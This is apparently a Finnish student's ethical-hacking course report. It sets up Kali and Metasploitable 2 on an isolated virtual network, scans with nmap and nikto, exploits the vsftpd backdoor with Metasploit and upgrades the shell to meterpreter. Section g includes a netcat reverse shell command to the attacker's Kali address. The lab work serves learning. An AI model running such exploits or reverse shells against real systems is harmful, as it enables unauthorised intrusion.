# h3 Lab Kid
## x) Lue/katso ja tiivistä. 
The Metasploit Framework on avoimen lähdekoodin penetraatiotestaus- ja hyökkäystyökalu, joka tarjoaa valikoiman moduuleja ja apuvälineitä haavoittuvuuksien löytämiseen ja hyödyntämiseen. Se mahdollistaa penetraatiotestauksen ja haavoittuvuuskartoituksen suorittamisen.

Yleisesti metasploitnetwork voidaan jakaa kolmeen pääosaan:

Kirjastot(Libraries):
REX, framework-core, framework-base 

Käyttöliittymät(Interfaces):
mfsconsole, armitage

Moduulit(Modules):
Hyökkäykset(Exploits)
Kuorma(Payloads)
Lisämoduulit(Auxiliary modules)
Jälkimoduulit(Post modules)
Koodin kääntäjät(Encoders)
Ei operaatioita(No operations=NOPs)

Nyrkkeilysäkki = Kalin ja Metasploitable 2:n asentaminen sekä kytkeminen samaan verkkoon. Luettu lähde (Riku Mannonen) https://rikumannonen935063021.wordpress.com/

## a) Kalin asennus virtual boxille
Aluksi tarvitsee virtualisointi alusta. Itsellä käytössä on [virtualbox](https://www.virtualbox.org/). Sen jälkeen vain asentakaan kali linux. Kali linuxin ISO tiedon saa ladattua [kali.org](https://www.kali.org/get-kali/#kali-installer-images) sivulta. Sitten kali linux pitää lisätä virtual boxiin ja asentaa käyttövalmiiksi.

Kun kali linuxin ISO on ladattu käynnistin virtual boxin ja painoin "New". Asetin haluaman vertiaalikoneen nimen, sekä tarvittavan typen ja version.

![Alt text](/H3LabKid/h3.a1.png)

Sitten ram muistin sekä prosessorien määrän asettaminen. Määritetään tarvittava levyn koko. Sitten next ja finnish.

![Alt text](/H3LabKid/h3.a2.png)

![Alt text](/H3LabKid/h3.a3.png)

Virtual boxissa settings kohdasta lisäsin storage kohtaan ladatun ISO tiedoston ja sen jälkeen startasin kali linuxin asennusohjelman virtual boxin start kohdasta.

![Alt text](/H3LabKid/h3.a4.png)

Valitsin Graphical install. Valitsin kielen, sijainnin ja näppäimistönkielen.

![Alt text](/H3LabKid/h3.a5.png)

Jätin hostnamen suositukseksi. Domain name ei tarvitse lisätä. Sen jälkeen käyttäjän lisääminen ja continue muutaman kerran ja asennus alkaa. Kun asennus on valmis virtuaalitietokone käynistyy uudelleen ja kysyy käyttäjätietoja. Kalin asennus on valmis.

![Alt text](/H3LabKid/h3.a6.png)

## b) Metasploitable 2 asennus virtual boxille
Metasploitable 2 lataus [täältä](https://sourceforge.net/projects/metasploitable/). Metasploitablen asentaminen pitäisi onnistu vain virtual boxiin lisäämisellä ja käynnistämisellä. Jostain syystä käynnistyksen yhteydessä kohtasin seuraavan ongelman. 

![Alt text](/H3LabKid/h3.b1.png)

[Netistä](https://www.youtube.com/watch?v=aYxfhMrjVhk&ab_channel=RKiLAB), kun selvittää niin tämä ongelmä näyttää ilmenneen ainakin vuoden ajan. Että sain käynnistettyä metasploitablen minun piti käynnistyksen aikana painaa ESC, jotta pääsi grub loaderiin. Sen jälkeen muokkasin Ubuntu 8.04, kernel 2.6.24-16-server kohtaa painamalla 'e'.

![Alt text](/H3LabKid/h3.b2.png)

Sitten muokkasin kohtia root ja kernel lisäämällä 'noapic' niiden perään. Tämän jälkeen painoin 'b' ja metasploitable käynnistyi onnistuneesti.

![Alt text](/H3LabKid/h3.b3.png)
![Alt text](/H3LabKid/h3.b4.png)

## c) Virtuaaliverkko koneiden välille

Muutin virtual boxissa asentamani kalin sekä metasploitablen network asetuksia. Kalin network adapter 1 laitoin NAT network ja adapter 2 laitoin host-only adapter ja valitsin name kohtaan virtuaalisen adapterin joka löytyi jo valmiiksi koneeltani. (Jos yhtään virtuaaliverkkoa ei löydy käy lisäämässä se virtual boxiin "File" > "Tools" > "Network Manager"
Luo uusi "Host-only Network" klikkaamalla "Create" Myös nat verkon lisääminen onnistuu samasta paikasta.)

![Alt text](/H3LabKid/h3.c2.png)
![Alt text](/H3LabKid/h3.c3.png)
![Alt text](/H3LabKid/h3.c4.png)

Tämän jälkeen käynnistin kalin ja testasin pääseekö sillä internettin nat yhteyden kautta. En saanyt yhteyttä internettiin, joten katsoin kalin verkkoasetukset ifconfig komennolla ja huomasin, että eth0:lla ei ollut ip-osoitetta. Joten pyydetään komennolla sellainen.

![Alt text](/H3LabKid/h3.c7.png)
      
    $ sudo dhclient eth0 
![Alt text](/H3LabKid/h3.c8.png)
![Alt text](/H3LabKid/h3.c6.png)

Nyt ainakin nat yhteys pelaa. Kun haluaa kalin internet yhteyden pois päältä käy muuttamassa virtual boxissa virtuaali koneen asetuksia settings > network > enable network adapter ja poistaa ruksin. Kun näin tekee näyttää ifconfig seuraavalta eikä internet yhteys toimi. 

![Alt text](/H3LabKid/h3.c12.png)

Tämän jälkeen testasin pingiä kalin ja metasploitablen välillä näyttää toimivan.

![Alt text](/H3LabKid/h3.c9.png)
![Alt text](/H3LabKid/h3.c10.png)

## d) Etsi Metasploitable porttiskannaamalla
Otin Kalin nat yhteyden aluksi pois eli nyt koneet eivät ole yhteydessä nettiin. Kalin ja metasploitablen välillä toimii virtuaalinen only-host verkko. Testasin, että nettiin ei ole yhteyttä. 

![Alt text](/H3LabKid/h3.d1.png)
![Alt text](/H3LabKid/h3.d2.png)

Loin msfdb tietokannan ja käynnistin kalilla metasploit framworking.

    $ sudo msfdb init
    $ msfconsole

Sitten katsoin hosts komennolla metasploitablen ip:n ja etsin porttiskannerilla sitä ip-osoitetta.

    $ hosts
    $ db_nmap -sn 192.168.56.102

![Alt text](/H3LabKid/h3.d4.png)

Totesin, että kyseinen verkko pitäisi olla olemassa, niin hain sitä netistä sen ip-osoitteella.

![Alt text](/H3LabKid/h3.d5.png)
    
Selvästi olen löytänyt oikein ip-osoiteen eli metasploitablen osoitteen.

## e) Porttiskannaa Metasploitable huolellisesti. Analysoi tulos. 

Tein laajemman skannauksen metasploitableen. -A yleisesti laajempi skannaus (eri versiot, script scanning jne.). Kaikki portit saadaan skannattua -p0- 

    $ db_nmap -A -p0- 192.168.56.102
![Alt text](/H3LabKid/h3.e1.png)

Metasploitablelta löytyi noin 20 avointa tcp porttia. Porttiskannaus kertoi porteissa pyörivien palveluiden versiot joiden avulla esimerkiksi [exploit DB:stä](https://www.exploit-db.com/) pystyisi hakemaan haavoittuvuuksia kyseisten palveluiden versioille. Lisäksi listasi myös muita saatuja tietoja tcp porttien palveluista. Tämä oli itselle ensimmäinen kerta, kun porttiskannaan jotain muuta kuin localhostia. Lähinni suurin osa tulostuksesta on uutta, joten en osaa sanoa mikä siinä olisi erikoista.

## f) Murtaudu Metasploitablen VsFtpd-palveluun Metasploitilla

Heataan msf:sta löytyykö kohteen vsftpd versiolle haavoittuvuutta. 

    > search vsftpd
![Alt text](/H3LabKid/h3.f1.png)

Löytyi yksi joten valitsin sen ja katsoin mitä asetuksia tälle pystyy asettamaan.

    $ use 0
    $ show options
![Alt text](/H3LabKid/h3.f2.png)

RPORT on automaattisesti määritelty 21, joten lisätään RHOSTS metasploitablen osoite.

    $ set rhosts 192.168.56.102
Tämän jälkeen hyökkäsin palveluun exploit komennolla. Kun shell yhteys on saatu kohteeseen voidaan hakea esimerkikse perus tietoja kohteesta komennoilla: whoami, id ja ifconfig.

![Alt text](/H3LabKid/h3.f3.png)

## g) Parempi sessio
Ensiksi yritin käyttään lähteen 6 netcat:ia saadakseni reverse shellin aikaan, mutta se ei toiminut ja lähteen mukaan tähän voi olla kaksi syytä. 1 netcat ei ole asennettu tukeudutulle palvelimelle tai 2 kaikissa netcat versioissa ei ole -e valintaa olemassa. 

    $ nc -e /bin/sh 192.168.56.101 4444
![Alt text](/H3LabKid/h3.g2.png)

Joten yritin seuraavaa tapaa joka oli lähteen 6 tapa muuttaa saavutettu sessio pty module:ksi.

    $ python -c 'import pty; pty.spawn("/bin/bash")'
![Alt text](/H3LabKid/h3.g1.png)

Kuten lähde mainitsi tämä pty module tapa on helppo mutta siinäkin on puutteita, kuten tab-täydennys ei toimi. Joten löysin lähteen 7 tavan muuttaa sessio meterpreter sessioksi. 

Ensiksi CTRL+Z, jotta saadaan nykyinen sessio taustalle. Sitten etsin shell_to_meterpreter msf:stä.

![Alt text](/H3LabKid/h3.g3.png)

    > use 0
    > show options

ja valitaan taustalla oleva sessio, tässä tapauksessa session 1. Sitten ajetaan se.

    > set SESSION 1
    > run
![Alt text](/H3LabKid/h3.g4.png)

Komento sessions -l listaa sessiot ja valitaan sieltä tehty meterpreter sessio.

    > sessions -l
![Alt text](/H3LabKid/h3.g5.png)

Huomataan, että tehty session on 2. Seuraavaksi suoritetaan tehty sessio komennolla:

    > sessions -i 2
![Alt text](/H3LabKid/h3.g6.png)

Sain muutettua session meterpreter sessioksi ja nyt olen tyytyväinen.

## h) Etsi, tutki ja kuvaile jokin hyökkäys ExploitDB:sta
Valitsin tähän käyttäjätunnuksen tunnistamis haavoittuvuuden ServiceNow järjestelmässä[EDB-ID: 50741](https://www.exploit-db.com/exploits/50741). Tässä haavoittuvuudessa järjestelmän salasanan palautuslomakkeen kautta pystytään selvittämään onko x niminen käyttäjä jo olemassa. Tämä johtuu siitä, että HTTP POST pyyntö palauttaa erilaisen vastauksen riippuen käyttäjän olemassa olosta. Tarkemmin järjestelmä palauttaa xml vastauksen joko muodossa 200 jos käyttäjä on olemassa tai 500 jos ei ole. Tämän avulla hyökkääjä voi käyttää sanalistaa ja automatisoida käyttäjätunnusten tarkistamisen selvittääkseen, mitkä käyttäjätunnukset ovat voimassa palvelussa: Tätä tietoa pystyy hyödyntämään esimerkiksi käyttäjien salasanojen murtamisessa/kalastelussa. 

## i) Etsi, tutki ja kuvaile hyökkäys 'searchsploit' -komennolla
Ensiksi searchsploitin päivitys

    $ searchsploit -u
Sitten hain tietokannasta haavoittuvuuksia. -t tarkoittaa, että otsikkon pitää sisältää apple mac.

    $ searchsploit -t apple mac
![Alt text](/H3LabKid/h3.i1.png)
![Alt text](/H3LabKid/h3.i3.png)  

Valitsin listan alhaalta haavoittuvuuden macOS 10.13 (17A365) - Kernel Memory Disclosure due to Lack of Bounds Checking in 'AppleIntelCapriController::getDisplayPipeCapability'. Haavoittuvuus öytyy täältä https://www.exploit-db.com/exploits/43780.

Kopion haavoittuvuuden kalin työpöydälle, että pääsen helposti tarkasteleemaan haavoittuvuuden ominaisuuksia.

    $ sudo cp /usr/share/exploitdb/exploits/macos/dos/43780.c /home/jokke/Desktop 
![Alt text](/H3LabKid/h3.i2.png)  

Rehellisesti en paljoa koodista ymmärtänyt, mutta käsitin, että kyseessä on puskurin ylivuoto haavoittuvuus 'AppleIntelCapriController::getDisplayPipeCapability' moduulissa, jonka avulla järjestelmän muistista on mahdollista saada jotain tietoja.

## j) Kokeile vapaavalintaista haavoittuvuusskanneria johonkin Metasploitablen palveluun. 
Testasin skanneria yleisesti koko metasploitableen. Käytin haavoittuvuuksien skannaukseen niktoa, koska se löytyä valmiina kalilta. 

![Alt text](/H3LabKid/h3.j1.png)

Tulosteesta huomataan, että esimerkiksi:

apachen versio on vanha, josta voi olla jotain hyötyä. Lisäksi apachen oletuskonfiguraatio etäkäyttäjien lukea koko palvelimen dokumentaatiotiedostoja. https://nvd.nist.gov/vuln/detail/CVE-1999-0678.

Nikto listasi myös OSVDB-12184 https://dev.nmap.narkive.com/qbxGwwaj/nse-php-version-disclosure-osvdb-12184 joka liittyy PHP palveluun lisäksi myös CVE-2003-1418 https://nvd.nist.gov/vuln/detail/CVE-2003-1418 joka voi paljastaa sensitiivisiä tietoja luvattomalle osapuolelle. Ja lisää PHP haavoittuvuuksia https://cwe.mitre.org/data/definitions/552.html, joka mahdollistaa luvattoman pääsyn tiedostoihin ja directoryihin.

HTTP TRACE metodi on aktivoitu, joka viittaa, että kohde on XST(Cross-Site Tracing) haavoittuvainen https://owasp.org/www-community/attacks/Cross_Site_Tracing

## k) Kokeile jotain itsellesi uutta työkalua, joka mainittiin x-kohdan läpikävelyohjeessa.
Katsoin [HackTheBox - PC](https://www.youtube.com/watch?v=AQSLvalzW8g&ab_channel=IppSec) videon yuotubesta. Harjoituksessa tuli vastaan yksi uusi työkalu, joka oli (9)gRPCurl. gRPCurl on cli työkalu, jota käytetään gRPC serverin pyyntöjen tekemiseen.

Asensin latasin Go:n(https://go.dev/doc/install), jotta voin kätevästi asentaa grpcurlin sen avulla, koska grRPCurl on Go-ohjelmointikieleen perustuva työkalu. Latasin go:n asennustiedoston kalille heidän sivuilta ja tein asennuksen sivun ohjeiden mukaan.

    $ rm -rf /usr/local/go && tar -C /usr/local -xzf go1.21.4.linux-amd64.tar.gz
    $ export PATH=$PATH:/usr/local/go/bin
Sitten asensin gRPCurlin.

    $ go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest

![Alt text](/H3LabKid/h3.k1.png)

grpculr ei vielä toimi, joten määritellään sille polku.

    $ go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest
    $ export PATH=$PATH:/home/jokke/go/bin
![Alt text](/H3LabKid/h3.k2.png)
Nyt huomataan, että gRPCurl toimii. Tarvitsen myös jonkin alustan gRPC-palvelun johon voin gRPCurlia kokeilla. Löysin lähteen 10, jossa hän oli rakentanut gRPC testiymäpäristön. Kloonasit github repositorion ja asensin samalla protoc:in, jotta palvelu toimiii.

    $ git clone https://github.com/nicholasjackson/all-things-microservices 
    $ sudo apt install protobuf-compiler  
Sitten käynnistin testi gRPC palvelun

    $ go run main.go   
![Alt text](/H3LabKid/h3.k3.png)

Sitten käyttämään gRPCurlia. Katsotan esin mitä vaihtoehtoja gRPCurlille on.

    $ grpcurl -h
![Alt text](/H3LabKid/h3.k5.png)

Esimerkiksi seuraava komento näyttää gRPC palvelut jotka ovat käynnissä testiympäristössä. --plaintext valintaa pitää käyttää, koska gRPC käyttää vakiona TLS salausta. 

      $ grpcurl --plaintext localhost:9092 list
![Alt text](/H3LabKid/h3.k4.png)

    $ grpcurl --plaintext localhost:9092 describe Currency

Antaa lisää tieto mitä Currency palvelu pitää sisällään.

![Alt text](/H3LabKid/h3.k6.png)

## m) Vapaaehtoinen: Kokeile hyökkäystä, joka löytyy ExploitDB:sta. Huomaa, että joidenkin vanhempien hyökkäysten mukana tulee harjoitusmaali.

## n) Vapaaehtoinen: Murtaudu johonkin toiseen Metasploitablen palveluun.

## o) Vapaaehtoinen: Asenna ja korkkaa Metasploitable 3. Karvinen 2018: Install Metasploitable 3 – Vulnerable Target Computer

## Lähteet
1 https://terokarvinen.com/2023/eettinen-hakkerointi-2023/

2 https://rikumannonen935063021.wordpress.com/

3 https://sourceforge.net/projects/metasploitable/

4 https://www.youtube.com/watch?v=aYxfhMrjVhk&ab_channel=RKiLAB

5 https://www.geeksforgeeks.org/how-to-install-metasploitable-2-in-virtualbox/

6 https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

7 https://infosecwriteups.com/metasploit-upgrade-normal-shell-to-meterpreter-shell-2f09be895646

8 https://www.exploit-db.com/exploits/50741

9 https://github.com/fullstorydev/grpcurl

10 https://github.com/nicholasjackson/all-things-microservices
